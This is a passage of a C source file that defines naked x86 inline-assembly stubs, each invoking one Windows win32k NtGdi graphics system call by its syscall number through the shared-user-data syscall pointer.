}

__declspec(naked) ULONG NTAPI NtGdiCreateMetafileDC()
{
    __asm {
        mov eax, 00001025h
        mov edx, KUSER_SHARED_SYSCALL
        call dword ptr [edx]
        retn 00000004h
    }
}

__declspec(naked) ULONG NTAPI NtGdiCreatePaletteInternal()
{
    __asm {
        mov eax, 00001026h
        mov edx, KUSER_SHARED_SYSCALL
        call dword ptr [edx]
        retn 00000008h
    }
}

__declspec(naked) ULONG NTAPI NtGdiCreatePatternBrushInternal()
{
    __asm {
        mov eax, 00001027h
        mov edx, KUSER_SHARED_SYSCALL
        call dword ptr [edx]
        retn 0000000Ch
    }
}

__declspec(naked) ULONG NTAPI NtGdiCreatePen()
{
    __asm {
        mov eax, 00001028h
        mov edx, KUSER_SHARED_SYSCALL
        call dword ptr [edx]
        retn 00000010h
    }
}

__declspec(naked) ULONG NTAPI NtGdiCreateRectRgn()
{
    __asm {
        mov eax, 00001029h
        mov edx, KUSER_SHARED_SYSCALL
        call dword ptr [edx]
        retn 00000010h
    }
}

__declspec(naked) ULONG NTAPI NtGdiCreateRoundRectRgn()
{
    __asm {
        mov eax, 0000102Ah
        mov edx, KUSER_SHARED_SYSCALL
        call dword ptr [edx]
        retn 00000018h
    }
}

__declspec(naked) ULONG NTAPI NtGdiCreateServerMetaFile()
{
    __asm {
        mov eax, 0000102Bh
        mov edx, KUSER_SHARED_SYSCALL
        call dword ptr [edx]
        retn 00000018h
    }
}

__declspec(naked) ULONG NTAPI NtGdiCreateSolidBrush()
{
    __asm {
        mov eax, 0000102Ch
        mov edx, KUSER_SHARED_SYSCALL
        call dword ptr [edx]
        retn 00000008h
    }
}

__declspec(naked) ULONG NTAPI NtGdiD3dContextCreate()
{
    __asm {
        mov eax, 0000102Dh
        mov edx, KUSER_SHARED_SYSCALL
        call dword ptr [edx]
        retn 00000010h
    }
}

__declspec(naked) ULONG NTAPI NtGdiD3dContextDestroy()
{
    __asm {
        mov eax, 0000102Eh
        mov edx, KUSER_SHARED_SYSCALL
        call dword ptr [edx]
        retn 00000004h
    }
}

__declspec(naked) ULONG NTAPI NtGdiD3dContextDestroyAll()
{
    __asm {
        mov eax, 0000102Fh
        mov edx, KUSER_SHARED_SYSCALL
        call dword ptr [edx]
        retn 00000004h
    }
}

__declspec(naked) ULONG NTAPI NtGdiD3dValidateTextureStageState()
{
    __asm {
        mov eax, 00001030h
        mov edx, KUSER_SHARED_SYSCALL
        call dword ptr [edx]
        retn 00000004h
    }
}

__declspec(naked) ULONG NTAPI NtGdiD3dDrawPrimitives2()
{
    __asm {
        mov eax, 00001031h
        mov edx, KUSER_SHARED_SYSCALL
        call dword ptr [edx]
        retn 0000001Ch
    }
}

__declspec(naked) ULONG NTAPI NtGdiDdGetDriverState()
{
    __asm {
        mov eax, 00001032h
        mov edx, KUSER_SHARED_SYSCALL
        call dword ptr [edx]
        retn 00000004h
    }
}

__declspec(naked) ULONG NTAPI NtGdiDdAddAttachedSurface()
{
    __asm {
        mov eax, 00001033h
        mov edx, KUSER_SHARED_SYSCALL
        call dword ptr [edx]
        retn 0000000Ch
    }
}

__declspec(naked) ULONG NTAPI NtGdiDdAlphaBlt()
{
    __asm {
        mov eax, 00001034h
        mov edx, KUSER_SHARED_SYSCALL
        call dword ptr [edx]
        retn 0000000Ch
    }
}

__declspec(naked) ULONG NTAPI NtGdiDdAttachSurface()
{
    __asm {
        mov eax, 00001035h
        mov edx, KUSER_SHARED_SYSCALL
        call dword ptr [edx]
        retn 00000008h
    }
}

__declspec(naked) ULONG NTAPI NtGdiDdBeginMoCompFrame()
{
    __asm {
        mov eax, 00001036h
        mov edx, KUSER_SHARED_SYSCALL
        call dword ptr [edx]
        retn 00000008h
    }
}

__declspec(naked) ULONG NTAPI NtGdiDdBlt()
{
    __asm {
        mov eax, 00001037h
        mov edx, KUSER_SHARED_SYSCALL
        call dword ptr [edx]
        retn 0000000Ch
    }
}

__declspec(naked) ULONG NTAPI NtGdiDdCanCreateSurface()
{
    __asm {
        mov eax, 00001038h
        mov edx, KUSER_SHARED_SYSCALL
        call dword ptr [edx]
        retn 00000008h
    }
}

__declspec(naked) ULONG NTAPI NtGdiDdCanCreateD3DBuffer()
{
    __asm {
        mov eax, 00001039h
        mov edx, KUSER_SHARED_SYSCALL
        call dword ptr [edx]
        retn 00000008h
    }
}

__declspec(naked) ULONG NTAPI NtGdiDdColorControl()
{
    __asm {
        mov eax, 0000103Ah
        mov edx, KUSER_SHARED_SYSCALL
        call dword ptr [edx]
        retn 00000008h
    }
}

__declspec(naked) ULONG NTAPI NtGdiDdCreateDirectDrawObject()
{
    __asm {
        mov eax, 0000103Bh
        mov edx, KUSER_SHARED_SYSCALL
        call dword ptr [edx]
        retn 00000004h
    }
}

__declspec(naked) ULONG NTAPI NtGdiDdCreateSurface()
{
    __asm {
        mov eax, 0000103Ch
        mov edx, KUSER_SHARED_SYSCALL
        call dword ptr [edx]
        retn 00000020h
    }
}

__declspec(naked) ULONG NTAPI NtGdiDdCreateD3DBuffer()
{
    __asm {
        mov eax, 0000103Dh
        mov edx, KUSER_SHARED_SYSCALL
        call dword ptr [edx]
        retn 00000020h
    }
}

__declspec(naked) ULONG NTAPI NtGdiDdCreateMoComp()
{
    __asm {
        mov eax, 0000103Eh
        mov edx, KUSER_SHARED_SYSCALL
        call dword ptr [edx]
        retn 00000008h
    }
}

__declspec(naked) ULONG NTAPI NtGdiDdCreateSurfaceObject()
{
    __asm {
        mov eax, 0000103Fh
        mov edx, KUSER_SHARED_SYSCALL
        call dword ptr [edx]
        retn 00000018h
    }
}

__declspec(naked) ULONG NTAPI NtGdiDdDeleteDirectDrawObject()
{
    __asm {
        mov eax, 00001040h
        mov edx, KUSER_SHARED_SYSCALL
        call dword ptr [edx]
        retn 00000004h
    }
}

__declspec(naked) ULONG NTAPI NtGdiDdDeleteSurfaceObject()
{
    __asm {
        mov eax, 00001041h
        mov edx, KUSER_SHARED_SYSCALL
        call dword ptr [edx]
        retn 00000004h
    }
}

__declspec(naked) ULONG NTAPI NtGdiDdDestroyMoComp()
{
    __asm {
        mov eax, 00001042h
        mov edx, KUSER_SHARED_SYSCALL
        call dword ptr [edx]
        retn 00000008h
    }
}

__declspec(naked) ULONG NTAPI NtGdiDdDestroySurface()
{
    __asm {
        mov eax, 00001043h
        mov edx, KUSER_SHARED_SYSCALL
        call dword ptr [edx]
        retn 00000008h
    }
}

__declspec(naked) ULONG NTAPI NtGdiDdDestroyD3DBuffer()
{
    __asm {
        mov eax, 00001044h
        mov edx, KUSER_SHARED_SYSCALL
        call dword ptr [edx]
        retn 00000004h
    }
}

__declspec(naked) ULONG NTAPI NtGdiDdEndMoCompFrame()
{
    __asm {
        mov eax, 00001045h
        mov edx, KUSER_SHARED_SYSCALL
        call dword ptr [edx]
        retn 00000008h
    }
}

__declspec(naked) ULONG NTAPI NtGdiDdFlip()
{
    __asm {
        mov eax, 00001046h
        mov edx, KUSER_SHARED_SYSCALL
        call dword ptr [edx]
        retn 00000014h
    }
}

__declspec(naked) ULONG NTAPI NtGdiDdFlipToGDISurface()
{
    __asm {
        mov eax, 00001047h
        mov edx, KUSER_SHARED_SYSCALL
        call dword ptr [edx]
        retn 00000008h
    }
}

__declspec(naked) ULONG NTAPI NtGdiDdGetAvailDriverMemory()
{
    __asm {
        mov eax, 00001048h
        mov edx, KUSER_SHARED_SYSCALL
        call dword ptr [edx]
        retn 00000008h
    }
}

__declspec(naked) ULONG NTAPI NtGdiDdGetBltStatus()
{
    __asm {
        mov eax, 00001049h
        mov edx, KUSER_SHARED_SYSCALL
        call dword ptr [edx]
        retn 00000008h
    }
}

__declspec(naked) ULONG NTAPI NtGdiDdGetDC()
{
    __asm {
        mov eax, 0000104Ah
        mov edx, KUSER_SHARED_SYSCALL
        call dword ptr [edx]
        retn 00000008h
    }
}

__declspec(naked) ULONG NTAPI NtGdiDdGetDriverInfo()
{
    __asm {
        mov eax, 0000104Bh
        mov edx, KUSER_SHARED_SYSCALL
        call dword ptr [edx]
        retn 00000008h
    }
}

__declspec(naked) ULONG NTAPI NtGdiDdGetDxHandle()
{
    __asm {
        mov eax, 0000104Ch
        mov edx, KUSER_SHARED_SYSCALL
        call dword ptr [edx]
        retn 0000000Ch
    }
}

__declspec(naked) ULONG NTAPI NtGdiDdGetFlipStatus()
{
    __asm {
        mov eax, 0000104Dh
        mov edx, KUSER_SHARED_SYSCALL
        call dword ptr [edx]
        retn 00000008h
    }
}

__declspec(naked) ULONG NTAPI NtGdiDdGetInternalMoCompInfo()
{
    __asm {
        mov eax, 0000104Eh
        mov edx, KUSER_SHARED_SYSCALL
        call dword ptr [edx]
        retn 00000008h
    }
}

__declspec(naked) ULONG NTAPI NtGdiDdGetMoCompBuffInfo()
{
    __asm {
        mov eax, 0000104Fh
        mov edx, KUSER_SHARED_SYSCALL
        call dword ptr [edx]
        retn 00000008h
    }
}

__declspec(naked) ULONG NTAPI NtGdiDdGetMoCompGuids()
{
    __asm {
        mov eax, 00001050h
        mov edx, KUSER_SHARED_SYSCALL
        call dword ptr [edx]
        retn 00000008h
    }
}

__declspec(naked) ULONG NTAPI NtGdiDdGetMoCompFormats()
{
    __asm {
        mov eax, 00001051h
        mov edx, KUSER_SHARED_SYSCALL
        call dword ptr [edx]
        retn 00000008h
    }
}

__declspec(naked) ULONG NTAPI NtGdiDdGetScanLine()
{
    __asm {
        mov eax, 00001052h
        mov edx, KUSER_SHARED_SYSCALL
        call dword ptr [edx]
        retn 00000008h
    }
}

__declspec(naked) ULONG NTAPI NtGdiDdLock()
{
    __asm {
        mov eax, 00001053h
        mov edx, KUSER_SHARED_SYSCALL
        call dword ptr [edx]
        retn 0000000Ch
    }
}

__declspec(naked) ULONG NTAPI NtGdiDdLockD3D()
{
    __asm {
        mov eax, 00001054h
        mov edx, KUSER_SHARED_SYSCALL
        call dword ptr [edx]
        retn 00000008h
    }
}

__declspec(naked) ULONG NTAPI NtGdiDdQueryDirectDrawObject()
{
    __asm {
        mov eax, 00001055h
        mov edx, KUSER_SHARED_SYSCALL
        call dword ptr [edx]
        retn 0000002Ch
    }
}

__declspec(naked) ULONG NTAPI NtGdiDdQueryMoCompStatus()
{
    __asm {
        mov eax, 00001056h
        mov edx, KUSER_SHARED_SYSCALL
        call dword ptr [edx]
        retn 00000008h
    }
}

__declspec(naked) ULONG NTAPI NtGdiDdReenableDirectDrawObject()
{
    __asm {
        mov eax, 00001057h
        mov edx, KUSER_SHARED_SYSCALL
        call dword ptr [edx]
        retn 00000008h
    }
}

__declspec(naked) ULONG NTAPI NtGdiDdReleaseDC()
{
    __asm {
        mov eax, 00001058h
        mov edx, KUSER_SHARED_SYSCALL
        call dword ptr [edx]
        retn 00000004h
    }
}

__declspec(naked) ULONG NTAPI NtGdiDdRenderMoComp()
{
    __asm {
        mov eax, 00001059h
        mov edx, KUSER_SHARED_SYSCALL
        call dword ptr [edx]
        retn 00000008h
    }
}

__declspec(naked) ULONG NTAPI NtGdiDdResetVisrgn()
{
    __asm {
        mov eax, 0000105Ah
        mov edx, KUSER_SHARED_SYSCALL
        call dword ptr [edx]
        retn 00000008h
    }
}

__declspec(naked) ULONG NTAPI NtGdiDdSetColorKey()
{
    __asm {
        mov eax, 0000105Bh
        mov edx, KUSER_SHARED_SYSCALL
        call dword ptr [edx]
        retn 00000008h
    }
}

__declspec(naked) ULONG NTAPI NtGdiDdSetExclusiveMode()
{
    __asm {
        mov eax, 0000105Ch
        mov edx, KUSER_SHARED_SYSCALL
        call dword ptr [edx]
        retn 00000008h
    }
}

__declspec(naked) ULONG NTAPI NtGdiDdSetGammaRamp()
{
    __asm {
        mov eax, 0000105Dh
        mov edx, KUSER_SHARED_SYSCALL
        call dword ptr [edx]
        retn 0000000Ch
    }
}

__declspec(naked) ULONG NTAPI NtGdiDdCreateSurfaceEx()
{
    __asm {
        mov eax, 0000105Eh
        mov edx, KUSER_SHARED_SYSCALL
        call dword ptr [edx]
        retn 0000000Ch
    }
}

__declspec(naked) ULONG NTAPI NtGdiDdSetOverlayPosition()
{
    __asm {
        mov eax, 0000105Fh
        mov edx, KUSER_SHARED_SYSCALL
        call dword ptr [edx]
        retn 0000000Ch
    }
}

__declspec(naked) ULONG NTAPI NtGdiDdUnattachSurface()
{
    __asm {
        mov eax, 00001060h
        mov edx, KUSER_SHARED_SYSCALL
        call dword ptr [edx]
        retn 00000008h
    }
}

__declspec(naked) ULONG NTAPI NtGdiDdUnlock()
{
    __asm {
        mov eax, 00001061h
        mov edx, KUSER_SHARED_SYSCALL
        call dword ptr [edx]
        retn 00000008h
    }
}

__declspec(naked) ULONG NTAPI NtGdiDdUnlockD3D()
{
    __asm {
        mov eax, 00001062h
        mov edx, KUSER_SHARED_SYSCALL
        call dword ptr [edx]
        retn 00000008h
    }
}

__declspec(naked) ULONG NTAPI NtGdiDdUpdateOverlay()
{
    __asm {
        mov eax, 00001063h
        mov edx, KUSER_SHARED_SYSCALL
        call dword ptr [edx]
        retn 0000000Ch
    }
}

__declspec(naked) ULONG NTAPI NtGdiDdWaitForVerticalBlank()
{
    __asm {
        mov eax, 00001064h
        mov edx, KUSER_SHARED_SYSCALL
        call dword ptr [edx]
        retn 00000008h
    }
}

__declspec(naked) ULONG NTAPI NtGdiDvpCanCreateVideoPort()
{
    __asm {
        mov eax, 00001065h
        mov edx, KUSER_SHARED_SYSCALL
        call dword ptr [edx]
        retn 00000008h
    }
}

__declspec(naked) ULONG NTAPI NtGdiDvpColorControl()
{
    __asm {
        mov eax, 00001066h
        mov edx, KUSER_SHARED_SYSCALL
        call dword ptr [edx]
        retn 00000008h
    }
}

__declspec(naked) ULONG NTAPI NtGdiDvpCreateVideoPort()
{
    __asm {
        mov eax, 00001067h
        mov edx, KUSER_SHARED_SYSCALL
        call dword ptr [edx]
        retn 00000008h
    }
}

__declspec(naked) ULONG NTAPI NtGdiDvpDestroyVideoPort()
{
    __asm {
        mov eax, 00001068h
        mov edx, KUSER_SHARED_SYSCALL
        call dword ptr [edx]
        retn 00000008h
    }
}

__declspec(naked) ULONG NTAPI NtGdiDvpFlipVideoPort()
{
    __asm {
        mov eax, 00001069h
        mov edx, KUSER_SHARED_SYSCALL
        call dword ptr [edx]
        retn 00000010h
    }
}

__declspec(naked) ULONG NTAPI NtGdiDvpGetVideoPortBandwidth()
{
    __asm {
        mov eax, 0000106Ah
        mov edx, KUSER_SHARED_SYSCALL
        call dword ptr [edx]
        retn 00000008h
    }
}

__declspec(naked) ULONG NTAPI NtGdiDvpGetVideoPortField()
{
    __asm {
        mov eax, 0000106Bh
        mov edx, KUSER_SHARED_SYSCALL
        call dword ptr [edx]
        retn 00000008h
    }
}

__declspec(naked) ULONG NTAPI NtGdiDvpGetVideoPortFlipStatus()
{
    __asm {
        mov eax, 0000106Ch
        mov edx, KUSER_SHARED_SYSCALL
        call dword ptr [edx]
        retn 00000008h
    }
}

__declspec(naked) ULONG NTAPI NtGdiDvpGetVideoPortInputFormats()
{
    __asm {
        mov eax, 0000106Dh
        mov edx, KUSER_SHARED_SYSCALL
        call dword ptr [edx]
        retn 00000008h
    }
}

__declspec(naked) ULONG NTAPI NtGdiDvpGetVideoPortLine()
{
    __asm {
        mov eax, 0000106Eh
        mov edx, KUSER_SHARED_SYSCALL
        call dword ptr [edx]
        retn 00000008h
    }
}

__declspec(naked) ULONG NTAPI NtGdiDvpGetVideoPortOutputFormats()
{
    __asm {
        mov eax, 0000106Fh
        mov edx, KUSER_SHARED_SYSCALL
        call dword ptr [edx]
        retn 00000008h
    }
}

__declspec(naked) ULONG NTAPI NtGdiDvpGetVideoPortConnectInfo()
{
    __asm {
        mov eax, 00001070h
        mov edx, KUSER_SHARED_SYSCALL
        call dword ptr [edx]
        retn 00000008h
    }
}

__declspec(naked) ULONG NTAPI NtGdiDvpGetVideoSignalStatus()
{
    __asm {
        mov eax, 00001071h
        mov edx, KUSER_SHARED_SYSCALL
        call dword ptr [edx]
        retn 00000008h
    }
}

__declspec(naked) ULONG NTAPI NtGdiDvpUpdateVideoPort()
{
    __asm {
        mov eax, 00001072h
        mov edx, KUSER_SHARED_SYSCALL
        call dword ptr [edx]
        retn 00000010h
    }
}

__declspec(naked) ULONG NTAPI NtGdiDvpWaitForVideoPortSync()
{
    __asm {
        mov eax, 00001073h
        mov edx, KUSER_SHARED_SYSCALL
        call dword ptr [edx]
        retn 00000008h
    }
}

__declspec(naked) ULONG NTAPI NtGdiDvpAcquireNotification()
{
    __asm {
        mov eax, 00001074h
        mov edx, KUSER_SHARED_SYSCALL
        call dword ptr [edx]
        retn 0000000Ch
    }
}

__declspec(naked) ULONG NTAPI NtGdiDvpReleaseNotification()
{
    __asm {
        mov eax, 00001075h
        mov edx, KUSER_SHARED_SYSCALL
        call dword ptr [edx]
        retn 00000008h
    }
}

__declspec(naked) ULONG NTAPI NtGdiDxgGenericThunk()
{
    __asm {
        mov eax, 00001076h
        mov edx, KUSER_SHARED_SYSCALL
        call dword ptr [edx]
        retn 00000018h
    }
}

__declspec(naked) ULONG NTAPI NtGdiDeleteClientObj()
{
    __asm {
        mov eax, 00001077h
        mov edx, KUSER_SHARED_SYSCALL
        call dword ptr [edx]
        retn 00000004h
    }
}

__declspec(naked) ULONG NTAPI NtGdiDeleteColorSpace()
{
    __asm {
        mov eax, 00001078h
        mov edx, KUSER_SHARED_SYSCALL
        call dword ptr [edx]
        retn 00000004h
    }
}

__declspec(naked) ULONG NTAPI NtGdiDeleteColorTransform()
{
    __asm {
        mov eax, 00001079h
        mov edx, KUSER_SHARED_SYSCALL
        call dword ptr [edx]
        retn 00000008h
    }
}

__declspec(naked) ULONG NTAPI NtGdiDeleteObjectApp()
{
    __asm {
        mov eax, 0000107Ah
        mov edx, KUSER_SHARED_SYSCALL
        call dword ptr [edx]
        retn 00000004h
    }
}

__declspec(naked) ULONG NTAPI NtGdiDescribePixelFormat()
{
    __asm {
        mov eax, 0000107Bh
        mov edx, KUSER_SHARED_SYSCALL
        call dword ptr [edx]
        retn 00000010h
    }
}

__declspec(naked) ULONG NTAPI NtGdiGetPerBandInfo()
{
    __asm {
        mov eax, 0000107Ch
        mov edx, KUSER_SHARED_SYSCALL
        call dword ptr [edx]
        retn 00000008h
    }
}

__declspec(naked) ULONG NTAPI NtGdiDoBanding()
{
    __asm {
        mov eax, 0000107Dh
        mov edx, KUSER_SHARED_SYSCALL
        call dword ptr [edx]
        retn 00000010h
    }
}

__declspec(naked) ULONG NTAPI NtGdiDoPalette()
{
    __asm {
        mov eax, 0000107Eh
        mov edx, KUSER_SHARED_SYSCALL
        call dword ptr [edx]
        retn 00000018h
    }
}

__declspec(naked) ULONG NTAPI NtGdiDrawEscape()
{
    __asm {
        mov eax, 0000107Fh
        mov edx, KUSER_SHARED_SYSCALL
        call dword ptr [edx]
        retn 00000010h
    }
}

__declspec(naked) ULONG NTAPI NtGdiEllipse()
{
    __asm {
        mov eax, 00001080h
        mov edx, KUSER_SHARED_SYSCALL
        call dword ptr [edx]
        retn 00000014h
    }
}

__declspec(naked) ULONG NTAPI NtGdiEnableEudc()
{
    __asm {
        mov eax, 00001081h
        mov edx, KUSER_SHARED_SYSCALL
        call dword ptr [edx]
        retn 00000004h
    }
}

__declspec(naked) ULONG NTAPI NtGdiEndDoc()
{
    __asm {
        mov eax, 00001082h
        mov edx, KUSER_SHARED_SYSCALL
        call dword ptr [edx]
        retn 00000004h
    }
}

__declspec(naked) ULONG NTAPI NtGdiEndPage()
{
    __asm {
        mov eax, 00001083h
        mov edx, KUSER_SHARED_SYSCALL
        call dword ptr [edx]
        retn 00000004h
    }
}

__declspec(naked) ULONG NTAPI NtGdiEndPath()
{
    __asm {
        mov eax, 00001084h
        mov edx, KUSER_SHARED_SYSCALL
        call dword ptr [edx]
        retn 00000004h
    }
}

__declspec(naked) ULONG NTAPI NtGdiEnumFontChunk()
{
    __asm {
        mov eax, 00001085h
        mov edx, KUSER_SHARED_SYSCALL
        call dword ptr [edx]
        retn 00000014h
    }
}

__declspec(naked) ULONG NTAPI NtGdiEnumFontClose()
{
    __asm {
        mov eax, 00001086h
        mov edx, KUSER_SHARED_SYSCALL
        call dword ptr [edx]
        retn 00000004h
    }
}

__declspec(naked) ULONG NTAPI NtGdiEnumFontOpen()
{
    __asm {
        mov eax, 00001087h
        mov edx, KUSER_SHARED_SYSCALL
        call dword ptr [edx]
        retn 0000001Ch
    }
}

__declspec(naked) ULONG NTAPI NtGdiEnumObjects()
{
    __asm {
        mov eax, 00001088h
        mov edx, KUSER_SHARED_SYSCALL
        call dword ptr [edx]
        retn 00000010h
    }
}

__declspec(naked) ULONG NTAPI NtGdiEqualRgn()
{
    __asm {
        mov eax, 00001089h
        mov edx, KUSER_SHARED_SYSCALL
        call dword ptr [edx]
        retn 00000008h
    }
}

__declspec(naked) ULONG NTAPI NtGdiEudcLoadUnloadLink()
{
    __asm {
        mov eax, 0000108Ah
        mov edx, KUSER_SHARED_SYSCALL
        call dword ptr [edx]
        retn 0000001Ch
    }
}

__declspec(naked) ULONG NTAPI NtGdiExcludeClipRect()
{
    __asm {
        mov eax, 0000108Bh
        mov edx, KUSER_SHARED_SYSCALL
        call dword ptr [edx]
        retn 00000014h
    }
}

__declspec(naked) ULONG NTAPI NtGdiExtCreatePen()
{
    __asm {
        mov eax, 0000108Ch
        mov edx, KUSER_SHARED_SYSCALL
        call dword ptr [edx]
        retn 0000002Ch
    }
}

__declspec(naked) ULONG NTAPI NtGdiExtCreateRegion()
{
    __asm {
        mov eax, 0000108Dh
        mov edx, KUSER_SHARED_SYSCALL
        call dword ptr [edx]
        retn 0000000Ch
    }
}

__declspec(naked) ULONG NTAPI NtGdiExtEscape()
{
    __asm {
        mov eax, 0000108Eh
        mov edx, KUSER_SHARED_SYSCALL
        call dword ptr [edx]
        retn 00000020h
    }
}

__declspec(naked) ULONG NTAPI NtGdiExtFloodFill()
{
    __asm {
        mov eax, 0000108Fh
        mov edx, KUSER_SHARED_SYSCALL
        call dword ptr [edx]
        retn 00000014h
    }
}

__declspec(naked) ULONG NTAPI NtGdiExtGetObjectW()
{
    __asm {
        mov eax, 00001090h
        mov edx, KUSER_SHARED_SYSCALL
        call dword ptr [edx]
        retn 0000000Ch
    }
}

__declspec(naked) ULONG NTAPI NtGdiExtSelectClipRgn()
{
    __asm {
        mov eax, 00001091h
        mov edx, KUSER_SHARED_SYSCALL
        call dword ptr [edx]
        retn 0000000Ch
    }
}

__declspec(naked) ULONG NTAPI NtGdiExtTextOutW()
{
    __asm {
        mov eax, 00001092h
        mov edx, KUSER_SHARED_SYSCALL
        call dword ptr [edx]
        retn 00000024h
    }
}

__declspec(naked) ULONG NTAPI NtGdiFillPath()
{
    __asm {
        mov eax, 00001093h
        mov edx, KUSER_SHARED_SYSCALL
        call dword ptr [edx]
        retn 00000004h
    }
}

__declspec(naked) ULONG NTAPI NtGdiFillRgn()
{
    __asm {
        mov eax, 00001094h
        mov edx, KUSER_SHARED_SYSCALL
        call dword ptr [edx]
        retn 0000000Ch
    }
}

__declspec(naked) ULONG NTAPI NtGdiFlattenPath()
{
    __asm {
        mov eax, 00001095h
        mov edx, KUSER_SHARED_SYSCALL
        call dword ptr [edx]
        retn 00000004h
    }
}

__declspec(naked) ULONG NTAPI NtGdiFlush()
{
    __asm {
        mov eax, 00001096h
        mov edx, KUSER_SHARED_SYSCALL
        call dword ptr [edx]
        retn 00000000h
    }
}

__declspec(naked) ULONG NTAPI NtGdiForceUFIMapping()
{
    __asm {
        mov eax, 00001097h
        mov edx, KUSER_SHARED_SYSCALL
        call dword ptr [edx]
        retn 00000008h
    }
}

__declspec(naked) ULONG NTAPI NtGdiFrameRgn()
{
    __asm {
        mov eax, 00001098h
        mov edx, KUSER_SHARED_SYSCALL
        call dword ptr [edx]
        retn 00000014h
    }
}

__declspec(naked) ULONG NTAPI NtGdiFullscreenControl()
{
    __asm {
        mov eax, 00001099h
        mov edx, KUSER_SHARED_SYSCALL
        call dword ptr [edx]
        retn 00000014h
    }
}

__declspec(naked) ULONG NTAPI NtGdiGetAndSetDCDword()
{
    __asm {
        mov eax, 0000109Ah
        mov edx, KUSER_SHARED_SYSCALL
        call dword ptr [edx]
        retn 00000010h
    }
}

__declspec(naked) ULONG NTAPI NtGdiGetAppClipBox()
{
    __asm {
        mov eax, 0000109Bh
        mov edx, KUSER_SHARED_SYSCALL
        call dword ptr [edx]
        retn 00000008h
    }
}

__declspec(naked) ULONG NTAPI NtGdiGetBitmapBits()
{
    __asm {
        mov eax, 0000109Ch
        mov edx, KUSER_SHARED_SYSCALL
        call dword ptr [edx]
        retn 0000000Ch
    }
}

__declspec(naked) ULONG NTAPI NtGdiGetBitmapDimension()
{
    __asm {
        mov eax, 0000109Dh
        mov edx, KUSER_SHARED_SYSCALL
        call dword ptr [edx]
        retn 00000008h
    }
}

__declspec(naked) ULONG NTAPI NtGdiGetBoundsRect()
{
    __asm {
        mov eax, 0000109Eh
        mov edx, KUSER_SHARED_SYSCALL
        call dword ptr [edx]
        retn 0000000Ch
    }
}

__declspec(naked) ULONG NTAPI NtGdiGetCharABCWidthsW()
{
    __asm {
        mov eax, 0000109Fh
        mov edx, KUSER_SHARED_SYSCALL
        call dword ptr [edx]
        retn 00000018h
    }
}

__declspec(naked) ULONG NTAPI NtGdiGetCharacterPlacementW()
{
    __asm {
        mov eax, 000010A0h
        mov edx, KUSER_SHARED_SYSCALL
        call dword ptr [edx]
        retn 00000018h
    }
}

__declspec(naked) ULONG NTAPI NtGdiGetCharSet()
{
    __asm {
        mov eax, 000010A1h
        mov edx, KUSER_SHARED_SYSCALL
        call dword ptr [edx]
        retn 00000004h
    }
}

__declspec(naked) ULONG NTAPI NtGdiGetCharWidthW()
{
    __asm {
        mov eax, 000010A2h
        mov edx, KUSER_SHARED_SYSCALL
        call dword ptr [edx]
        retn 00000018h
    }
}

__declspec(naked) ULONG NTAPI NtGdiGetCharWidthInfo()
{
    __asm {
        mov eax, 000010A3h
        mov edx, KUSER_SHARED_SYSCALL
        call dword ptr [edx]
        retn 00000008h
    }
}

__declspec(naked) ULONG NTAPI NtGdiGetColorAdjustment()
{
    __asm {
        mov eax, 000010A4h
        mov edx, KUSER_SHARED_SYSCALL
        call dword ptr [edx]
        retn 00000008h
    }
}

__declspec(naked) ULONG NTAPI NtGdiGetColorSpaceforBitmap()
{
    __asm {
        mov eax, 000010A5h
        mov edx, KUSER_SHARED_SYSCALL
        call dword ptr [edx]
        retn 00000004h
    }
}

__declspec(naked) ULONG NTAPI NtGdiGetDCDword()
{
    __asm {
        mov eax, 000010A6h
        mov edx, KUSER_SHARED_SYSCALL
        call dword ptr [edx]
        retn 0000000Ch
    }
}

__declspec(naked) ULONG NTAPI NtGdiGetDCforBitmap()
{
    __asm {
        mov eax, 000010A7h
        mov edx, KUSER_SHARED_SYSCALL
        call dword ptr [edx]
        retn 00000004h
    }
}

__declspec(naked) ULONG NTAPI NtGdiGetDCObject()
{
    __asm {
        mov eax, 000010A8h
        mov edx, KUSER_SHARED_SYSCALL
        call dword ptr [edx]
        retn 00000008h
    }
}

__declspec(naked) ULONG NTAPI NtGdiGetDCPoint()
{
    __asm {
        mov eax, 000010A9h
        mov edx, KUSER_SHARED_SYSCALL
        call dword ptr [edx]
        retn 0000000Ch
    }
}

__declspec(naked) ULONG NTAPI NtGdiGetDeviceCaps()
{
    __asm {
        mov eax, 000010AAh
        mov edx, KUSER_SHARED_SYSCALL
        call dword ptr [edx]
        retn 00000008h
    }
}

__declspec(naked) ULONG NTAPI NtGdiGetDeviceGammaRamp()
{
    __asm {
        mov eax, 000010ABh
        mov edx, KUSER_SHARED_SYSCALL
        call dword ptr [edx]
        retn 00000008h
    }
}

__declspec(naked) ULONG NTAPI NtGdiGetDeviceCapsAll()
{
    __asm {
        mov eax, 000010ACh
        mov edx, KUSER_SHARED_SYSCALL
        call dword ptr [edx]
        retn 00000008h
    }
}

__declspec(naked) ULONG NTAPI NtGdiGetDIBitsInternal()
{
    __asm {
        mov eax, 000010ADh
        mov edx, KUSER_SHARED_SYSCALL
        call dword ptr [edx]
        retn 00000024h
    }
}

__declspec(naked) ULONG NTAPI NtGdiGetETM()
{
    __asm {
        mov eax, 000010AEh
        mov edx, KUSER_SHARED_SYSCALL
        call dword ptr [edx]
        retn 00000008h
    }
}

__declspec(naked) ULONG NTAPI NtGdiGetEudcTimeStampEx()
{
    __asm {
        mov eax, 000010AFh
        mov edx, KUSER_SHARED_SYSCALL
        call dword ptr [edx]
        retn 0000000Ch
    }
}

__declspec(naked) ULONG NTAPI NtGdiGetFontData()
{
    __asm {
        mov eax, 000010B0h
        mov edx, KUSER_SHARED_SYSCALL
        call dword ptr [edx]
        retn 00000014h
    }
}

__declspec(naked) ULONG NTAPI NtGdiGetFontResourceInfoInternalW()
{
    __asm {
        mov eax, 000010B1h
        mov edx, KUSER_SHARED_SYSCALL
        call dword ptr [edx]
        retn 0000001Ch
    }
}

__declspec(naked) ULONG NTAPI NtGdiGetGlyphIndicesW()
{
    __asm {
        mov eax, 000010B2h
        mov edx, KUSER_SHARED_SYSCALL
        call dword ptr [edx]
        retn 00000014h
    }
}

__declspec(naked) ULONG NTAPI NtGdiGetGlyphIndicesWInternal()
{
    __asm {
        mov eax, 000010B3h
        mov edx, KUSER_SHARED_SYSCALL
        call dword ptr [edx]
        retn 00000018h
    }
}

__declspec(naked) ULONG NTAPI NtGdiGetGlyphOutline()
{
    __asm {
        mov eax, 000010B4h
        mov edx, KUSER_SHARED_SYSCALL
        call dword ptr [edx]
        retn 00000020h
    }
}

__declspec(naked) ULONG NTAPI NtGdiGetKerningPairs()
{
    __asm {
        mov eax, 000010B5h
        mov edx, KUSER_SHARED_SYSCALL
        call dword ptr [edx]
